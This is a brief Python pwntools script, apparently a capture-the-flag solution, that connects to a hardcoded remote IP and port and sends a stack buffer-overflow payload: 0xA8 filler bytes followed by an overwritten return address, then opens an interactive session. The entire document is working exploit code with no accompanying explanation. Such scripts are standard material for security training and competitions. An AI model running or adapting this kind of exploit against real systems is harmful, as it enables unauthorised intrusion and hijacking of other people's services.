from pwn import *
io = remote("61.147.171.105",50907)
return_addr = 0x400762
payload = b'a'* 0xA8 + p64(return_addr)
io.sendlineafter('that??', payload)
io.interactive()